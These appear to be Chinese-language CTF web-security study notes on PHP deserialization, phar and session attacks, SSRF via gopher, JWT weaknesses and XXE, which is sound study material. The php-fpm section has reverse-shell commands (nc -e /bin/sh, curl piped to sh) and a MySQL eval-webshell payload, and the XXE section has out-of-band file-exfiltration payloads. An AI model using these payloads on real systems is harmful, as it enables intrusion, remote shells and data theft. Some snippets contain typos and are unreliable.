<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">service1</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">service2</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c</span>(<span class="hljs-params"></span>)</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"></span>)</span>;<br>&#125;<br><span class="hljs-comment">//继承</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">service1</span>,<span class="hljs-title">service2</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;..&#125;;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;..&#125;;<br>&#125;<br></code></pre></td></tr></table></figure>
<ul>
<li>trait：不是类，代码复用的集合，集合一些普遍操作</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span>&#123;&#125;;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;&#125;;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;]<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">a</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<ul>
<li>匿名类：直接new一个class，无需命名：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">play</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>-&gt;username;<br>	&#125;;<br>&#125;<br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$v</span>-&gt;<span class="hljs-title function_ invoke__">play</span>(<span class="hljs-keyword">new</span> <span class="hljs-keyword">class</span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hello&quot;</span>&#125;)<br><span class="hljs-comment">//class中属性的命名可以通过构造函数</span><br></code></pre></td></tr></table></figure>
<h3 id="序列化serialize">序列化serialize</h3>
<p>将对象变为可以传输的字符串：</p>
<p>private属性，序列化后，属性名为：%00+类名+%00+属性名</p>
<p>protect属性，系列化后，属性名为：%00+*+%00+属性名</p>
<h3 id="反序列化unserialize">反序列化unserialize</h3>
<p>将字符串变为可调用对象。</p>
<p>e.g.<code>O:6:&quot;animal&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;</code></p>
<p><code>O:对象,6:对象名长度,animal:对象名,1:属性个数,s:属性类型,4:属性名长度,name:属性名,N:属性值，为空</code></p>
<p>反序列化流程：</p>
<ol>
<li>找到反序列化的字符串中规定的类名字</li>
<li>实例化这个类，但不通过构造函数</li>
<li>属性赋值</li>
<li>执行魔术方法</li>
<li>返回构造的对象</li>
</ol>
<h3 id="注意事项">注意事项</h3>
<p>序列化与反序列化与类中方法无关；</p>
<p>接口类：不可以序列化，没有实例化对象；</p>
<p>匿名类：不可以序列化，没有类名；</p>
<p>trait：不可以序列化，没有实例化对象；</p>
<p>属性值可以是一个对象（套娃或者实现首尾相连）</p>
<h3 id="魔术方法">魔术方法</h3>
<h4 id="construct（）">__construct（）</h4>
<p>只有实例化对象（new）时会自动调用，不能重复声明，可以通过该函数为私有属性赋值。</p>
<h4 id="destruct">__destruct()</h4>
<p>类对象将要销毁时（脚本运行完毕时）自动调用。</p>
<p>类对象必须在代码中应用（new或者unserialize产生）；</p>
<p>优先级大于die()和exit()；</p>
<p>可以强制删除进程(windows)来绕过<code>system('taskkill /fi &quot;imagename eq php.exe&quot; /f')</code>，浏览器使用<code>php-cgi.exe</code>。</p>
<h4 id="sleep-和-wakeup">sleep() 和 wakeup()</h4>
<p>序列化时自动调用sleep()，需要返回属性名；</p>
<p>反序列化时自动调用wakeup()。</p>
<h4 id="call-和callstatic">call()和callstatic()</h4>
<p>调用不存在的方法时，自动调用call()，例如<code>$tmp-&gt;nothing()</code>；</p>
<p>调用不存在的静态方法时，自动调用callstatic()，例如<code>tmp::nothing()</code>。</p>
<h4 id="get-set-和isset-unset">get(),set()和isset(),unset()</h4>
<p>get()：访问不存在的属性或者不可访问属性时，自动调用</p>
<p>set()：赋值不存在的属性或者不可访问属性时，自动调用</p>
<p>isset()：使用isset函数访问不存在的属性或者不可访问属性时，自动调用</p>
<p>unset：使用unset函数访问不存在的属性或者不可访问属性时，自动调用</p>
<h4 id="tostring">tostring()</h4>
<p>类实例与字符串拼接或者作为字符串引用时，自动调用。</p>
<h4 id="invoke-方法">invoke()方法</h4>
<p>类实例被作为函数名执行时，自动调用。</p>
<h4 id="set-state-方法">__set_state()方法</h4>
<p>var_export($a)返回变量结构信息，自动调用。</p>
<h4 id="debuginfo-方法">__debuginfo()方法</h4>
<p>var_dump($a)打印变量信息时，自动调用。</p>
<h4 id="clone-方法">__clone()方法</h4>
<p>使用clone复制一个对象，自动调用。</p>
<h3 id="反序列化条件">反序列化条件</h3>
<p>有反序列化字符串提交入口；</p>
<p>被反序列化的类的魔术方法有可能被利用。</p>
<p>做法：本地赋值后序列化得出反序列化字符串。</p>
<h3 id="绕过">绕过</h3>
<h4 id="绕过wakeup方法">绕过wakeup方法</h4>
<p>条件：php5-php5.6.25；php7-php7.0.10</p>
<p>修改反序列化字符串中表示属性个数大于实际属性个数。</p>
<h4 id="绕过O：数字">绕过O：数字</h4>
<p>修改为<code>O：+(%2b)数字</code></p>
<h4 id="绕过值相等">绕过值相等</h4>
<p>使用<code>&amp;</code>，e.g.this-&gt;password=&amp;this-&gt;secret，在construct方法中，通过指向相同的地址来实现值相等。</p>
<h4 id="绕过关键词">绕过关键词</h4>
<p>使用16进制，将属性类型有<code>s</code>改为<code>S</code>，后续属性名可以用ascii码代替，e.g.name=n\97me，注意单引号也需要转义为<code>\'</code>。</p>
<h4 id="绕过exception">绕过exception</h4>
<p>exception优先级小于destruct，不影响析构函数执行。</p>
<h4 id="字符逃逸">字符逃逸</h4>
<p>代码使用strplace将属性名长度从少替换为多时，反序列化字符串中属性值的长度不会改变，后续的值不会读入，造成后续的字符逃逸，可多次替换，空余出足够的字符数逃逸，替换后续的属性值。</p>
<h3 id="高级反序列化">高级反序列化</h3>
<h4 id="phar反序列化">phar反序列化</h4>
<h5 id="phar文件">phar文件</h5>
<p>多个php文件合并为独立压缩包，不解压就能执行，支持web服务器和命令行</p>
<h5 id="phar协议：phar">phar协议：phar://</h5>
<p>创建phar包</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">phar</span>(<span class="hljs-string">&quot;name.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">buildFromDirectory</span>(_FILE_).<span class="hljs-string">&#x27;xxxx&#x27;</span>;  <span class="hljs-comment">#当前文件夹的xxxx</span><br>	<span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">createdefaultstub</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;index.php&#x27;</span>)); <span class="hljs-comment">#将flag.php内容作为phar的index</span><br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setmetadata</span>(<span class="hljs-variable">$u</span>) <span class="hljs-comment">#phar中存入类实例，以反序列字符串的形式存放至phar文件中，使用phar协议加载phar文件时，会自动进行反序列化创建类对象</span><br>   <br></code></pre></td></tr></table></figure>
<h5 id="使用phar协议的函数">使用phar协议的函数</h5>
<p>include，file_exists()，file_get_contents()，file_put_contents()，require，fileinode()，filetime()，filesize()，is_dir()，scandir()，highlight_file()，.user.ini:auto_append_file=phar://xx.phar</p>
<h5 id="利用">利用</h5>
<p>能上传phar文件，有可利用的文件读取方式，能控制phar文件头。</p>
<h4 id="session反序列化">session反序列化</h4>
<h5 id="上传session文件">上传session文件</h5>
<p>只要页面启动了session，就会读取session文件的内容至页面中，可以通过特定方式来上传session文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">file = <br>&#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:&#123;payload:<span class="hljs-string">&#x27;aaa&#x27;</span>&#125;<br>&#125;<br>data = <br>&#123;<br>    <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>=<span class="hljs-number">123</span><br>&#125;<br>cookie = <br>&#123;<br>    <span class="hljs-string">&quot;PHPSESSIONID&quot;</span>:<span class="hljs-string">&quot;XXX&quot;</span>   <span class="hljs-comment">#浏览器查找</span><br>&#125;<br>s = request.session()<br>res = s.post(url=url,data=data,file=file,cookie=cookie,proxies=&#123;<span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>&#125;)<br></code></pre></td></tr></table></figure>
<p>在session文件中存储对象时，会自动进行反序列化，反序列化字符串的形式由处理器决定。</p>
<ul>
<li>php处理器</li>
</ul>
<p>u|{反序列化字符串}</p>
<ul>
<li>php_serialize处理器</li>
</ul>
<p>a:1:{s:1:u;o:4:user:xxx}</p>
<p>a数组，s会话key内容，o元素类型</p>
<p>在php_serialize页面的类中属性值传入xx|{反序列化字符串}的形式，在使用php处理器的页面中进行反序列化，会自动以|进行分隔，反序列传入的{反序列化字符串}。</p>
<h2 id="php框架">php框架</h2>
<h3 id="MVC结构设计思路">MVC结构设计思路</h3>
<p>M：模型，负责处理数据</p>
<p>V： 视图，负责向control发送数据后显示出来</p>
<p>C：控制器，负责分发请求</p>
<p>在web中的应用：</p>
<ul>
<li>所有请求统一入口（index.php）</li>
<li>index.php作为控制器，统一分发请求</li>
<li>请求分发给model后返回数据给控制器</li>
<li>控制器得到数据后根据view显示出来</li>
</ul>
<p>特点：</p>
<ul>
<li>从基于文件的url转为基于路由的url（关注文件-&gt;关注访问的参数）</li>
<li>模型对用户透明</li>
</ul>
<h3 id="ThinkPHP框架的反序列化链">ThinkPHP框架的反序列化链</h3>
<h4 id="tp5">tp5</h4>
<p>/index.php/?s=/index(模块)/index(控制器)/ctfshow(方法)</p>
<p>构造POP链：<strong>熟悉代码</strong></p>
<h2 id="ssrf服务端请求伪造">ssrf服务端请求伪造</h2>
<p>控制服务器使用指定协议访问指定的URL。</p>
<p>条件：url外部可控；<strong>服务端有接收url并进行访问的功能</strong>。（header()函数的功能是实现重定向，针对客户端多次访问，不属于ssrf）。</p>
<p><strong>URL格式：schema:[//authority]/path[?query] [#fragment]</strong></p>
<p>schema—表示协议</p>
<p>://—表示分隔</p>
<p>authority—[userinfo@]host[:port]</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">userinfo@默认使用匿名账户，可以省略，格式为username:password@，如果支持匿名账户，说明支持任意用户名和密码<br>:port为端口号，默认为80，可以省略<br></code></pre></td></tr></table></figure>
<p>利用：</p>
<ol>
<li>任意文件读取，必须知道文件名，可以使用<strong>file:///etc/passwd</strong>进行尝试，看是否存在ssrf漏洞</li>
<li>探测内网资源</li>
</ol>
<h3 id="端口扫描">端口扫描</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;xxx&quot;</span><br><br>ports = [<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">6379</span>]<br><br><span class="hljs-comment">#21 ftp</span><br><span class="hljs-comment">#22 ssh</span><br><span class="hljs-comment">#80 http</span><br><span class="hljs-comment">#443 https</span><br><span class="hljs-comment">#3389 rdp windows远程桌面</span><br><span class="hljs-comment">#1433 ms-sqlserver 默认端口</span><br><span class="hljs-comment">#3306 mysql 默认端口</span><br><span class="hljs-comment">#6379 redis 默认端口</span><br><span class="hljs-comment">#9000 php-fpm 默认端口</span><br><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> ports:<br>    <span class="hljs-keyword">try</span>:<br>        data=&#123;<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">f&quot;gopher://127.0.0.1:<span class="hljs-subst">&#123;p&#125;</span>/&quot;</span>&#125;<br>        response = requests.post(url=url,data=data,timeout=<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;端口<span class="hljs-subst">&#123;p&#125;</span>开放&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<p>gopher协议：转发数据至指定端口，上述<code>gopher://127.0.0.1:port/</code>格式发送空数据，若端口开放，服务器会等待数据至连接超时，若不开放，则会直接断开。</p>
<h3 id="使用gopher协议拓展攻击面">使用gopher协议拓展攻击面</h3>
<p>使用gopherue工具，需要二次编码。</p>
<h4 id="redis">redis</h4>
<p>保存键值对的软件，监听6379端口</p>
<h4 id="mysql">mysql</h4>
<p>监听3306端口，仅支持用户密码为空的情况，payload设置为<code>select '&lt;?php eval($_POST[1]); ?&gt;' into outfile '/var/www/html/1.php';</code></p>
<h4 id="php-fpm">php-fpm</h4>
<p>监听9000端口，仅允许127.0.0.1访问，负责对php文件进行解释执行。在gopherus中exploit为<code>fastcgi</code>，输入的file必须为存在的文件，例如<code>/var/www/html/index.php</code>，执行的命令为<code>nc IP 3389 -e /bin/sh</code>或者<code>curl https://your-shell.com/IP:3389 |sh</code>。</p>
<p>原理：通过向9000端口发送php执行请求，设置.user.ini参数，使用auto_append_file来添加php://input包含的恶意代码后执行。</p>
<h3 id="php原生类ssrf（soap插件）">php原生类ssrf（soap插件）</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$soap</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapCilent</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-variable">$soap</span>-&gt;<span class="hljs-title function_ invoke__">hack</span>();   <span class="hljs-comment">//调用SoapCilent不存在的方法，调用call()</span><br><span class="hljs-comment">//call函数会访问指定的url，但仅支持http协议</span><br></code></pre></td></tr></table></figure>
<h3 id="ssrf绕过">ssrf绕过</h3>
<h4 id="不允许本地访问，过滤127-0-0-1">不允许本地访问，过滤127.0.0.1</h4>
<ul>
<li>使用alphanumerics</li>
</ul>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">127.⓿.⓿.1<br></code></pre></td></tr></table></figure>
<ul>
<li>进制转换绕过</li>
</ul>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">127.0.0.1用不同进制可以表示为<br>- 2130706433  10进制 http://2130706433  <br>- 017700000001 8进制 http://017700000001 <br>- 7F000001 16进制   http://0x7F000001 <br></code></pre></td></tr></table></figure>
<ul>
<li>特殊语法绕过</li>
</ul>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tex">Windows 下 0 代表的是0.0.0.0 <br>而Linux 下 0 代表的是127.0.0.1<br><br>127.0.0.1 可以省略为 127.1<br><br>127。0。0。1 可以替代127.0.0.1<br></code></pre></td></tr></table></figure>
<h4 id="其他过滤">其他过滤</h4>
<ul>
<li>如果服务端接收302跳转并跟进，可以发送http协议，但跳转到location的其他协议</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$schema</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$ip</span>     = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;i&#x27;</span>];<br><span class="hljs-variable">$port</span>   = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$query</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$port</span>))&#123;  <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$query</span>&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$query</span>&quot;</span>); <br>&#125;<br><br></code></pre></td></tr></table></figure>
<ul>
<li>短网址绕过</li>
</ul>
<p>在线生成可替换原网址的短网址。</p>
<h2 id="JWT">JWT</h2>
<p>cookie中token的一种，起验证的作用，设置cookie：<code>setcookie('key',value)</code>。</p>
<p>作用过程：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tex">?username=admin<span class="hljs-built_in">&amp;</span>score=100  别人传递过程中，会对积分进行篡改 <br><br>?username=admin<span class="hljs-built_in">&amp;</span>score=100<span class="hljs-built_in">&amp;</span>token=hash(username=admin<span class="hljs-built_in">&amp;</span>score=100)  加哈希进行验证<br><br>但篡改数据的同时，破解了算法，篡改了签名<br><br>引入加盐机制，salt（保密）<br>username=admin——salt<span class="hljs-built_in">&amp;</span>score=100<span class="hljs-built_in">&amp;</span>token=hash(username=admin<span class="hljs-built_in">_</span>salt<span class="hljs-built_in">&amp;</span>score=100)<br><br>盐值有可能被爆破，也有可能被泄露<br><br>增加更复杂的哈希函数；提高盐值的长度。<br></code></pre></td></tr></table></figure>
<h3 id="利用点-2">利用点</h3>
<ol>
<li>当不校验哈希算法时，可以替换算法为空，绕过算法校验</li>
<li>在哈希函数中使用简单密码，可以利用c-jwt-cracker爆破工具（<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker%EF%BC%89%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%E2%80%94linux">https://github.com/brendan-rius/c-jwt-cracker）进行爆破—linux</a> docker</li>
<li>在哈希函数中使用非对称密码：</li>
</ol>
<p>私钥泄露：生成任意jwt字符串</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);  <span class="hljs-comment">//库函数</span><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>
<p>公钥泄露：修改算法为对称算法，双方均使用公钥验证。</p>
<h2 id="XXE利用">XXE利用</h2>
<p>xml实体注入，当程序处理xml文件时，没有进制对外部实体的处理，容易造成xxe漏洞，实现任意文件读取。</p>
<p>xml文件，一般表示带有结构的数据。例如:</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tex">&lt;祖父&gt;<br>	&lt;叔父1&gt;<br>	&lt;/叔父1&gt;<br>	<br>	&lt;叔父2&gt;<br>	&lt;/叔父2&gt;<br><br>&lt;/祖父&gt;<br></code></pre></td></tr></table></figure>
<h3 id="利用-2">利用</h3>
<h4 id="有回显点">有回显点</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE hacker[<br>    &lt;!ENTITY hacker SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>]&gt; <br><br>&lt;root&gt;<br>    &lt;ctfshow&gt;     <span class="hljs-comment">//题目中明确访问的属性</span><br>        &amp;hacker;<br>    &lt;/ctfshow&gt;<br>&lt;/root&gt;<br></code></pre></td></tr></table></figure>
<h4 id="无回显点">无回显点</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE hacker[<br>    &lt;!ENTITY  % file SYSTEM <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;<br>    &lt;!ENTITY  % myurl SYSTEM <span class="hljs-string">&quot;http://IP/test.dtd&quot;</span>&gt;<br>    %myurl;<br>]&gt; <br>&lt;root&gt;<br><span class="hljs-number">1</span><br>&lt;/root&gt;<br><br>test.dtd内容：<br><br>&lt;!ENTITY % dtd <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; vps SYSTEM &#x27;http://IP:3389/%file;&#x27;&gt; &quot;</span>&gt;<br>%dtd;<br>%vps;<br><br><br><span class="hljs-comment">//文件内容过长会读取失败</span><br><span class="hljs-comment">//IP本机监听3389端口 nc -lvvnp 3389</span><br></code></pre></td></tr></table></figure>
<h2 id="SSTI服务器模版注入">SSTI服务器模版注入</h2>
<h3 id="python理论">python理论</h3>
<p>指定编码方式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*- coding: utf-8 -*-</span><br></code></pre></td></tr></table></figure>
<p>指定解释器：</p>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tex"><span class="hljs-params">#</span>!/usr/bin/python3<br>chmod +x ./payload.py<br>./payload.py<br><br>//等于<br>python payload.py<br></code></pre></td></tr></table></figure>
<p>换行：一行写不下可以使用<code>\</code>进行换行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;aa\</span><br><span class="hljs-string">bb\</span><br><span class="hljs-string">cc&quot;</span>)<br><br>//输出aabbcc<br></code></pre></td></tr></table></figure>
<h4 id="数据结构">数据结构</h4>
<ul>
<li>
<p>数字: complex 复数  1+2j 1.1+2.2j</p>
</li>
<li>
<p>字符串：</p>
</li>
</ul>
<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs tex">几种形式：<br>&#x27;aa&#x27; <br>&quot;aaaa&quot;<br>&#x27;&#x27;&#x27;<br>aaaaa<br>&#x27;&#x27;&#x27;<br><br>r 标志:<br>r&#x27;aa<span class="hljs-keyword">\nbb</span>&#x27; 取消转义<br><br>可以进行+,*,也可以使用下标进行引用：<br>a[2:6:2]：左闭右开，两个取一次<br></code></pre></td></tr></table></figure>
<ul>
<li>列表：[]，使用负数下标，则为倒数第几</li>
<li>元组：()，定义后不能修改</li>
<li>集合：{}或set(xxx)，里面的内容不能重复，如果出现重复，会进行覆盖</li>
</ul>
